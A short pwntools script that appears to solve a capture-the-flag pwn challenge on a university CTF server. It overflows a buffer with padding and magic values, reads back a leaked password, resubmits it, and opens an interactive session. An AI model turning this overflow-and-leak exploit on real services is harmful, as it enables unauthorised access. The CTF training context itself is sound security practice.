from pwn import *

#r = remote("127.0.0.1", 8888)
r = remote("ctf.adl.csie.ncu.edu.tw", 11002)
context.arch = "amd64"

r.recvuntil(":")
r.recvuntil(":")


r.sendline("a" * 12 + p32(0xfaceb00c) + p32(0xdeadbeef))
r.recvuntil('a' * 12)
r.recv(8)
password = u32(r.recv(4))
r.recvuntil("password:")

r.sendline(str(password))
r.recvuntil("!")

r.interactive()

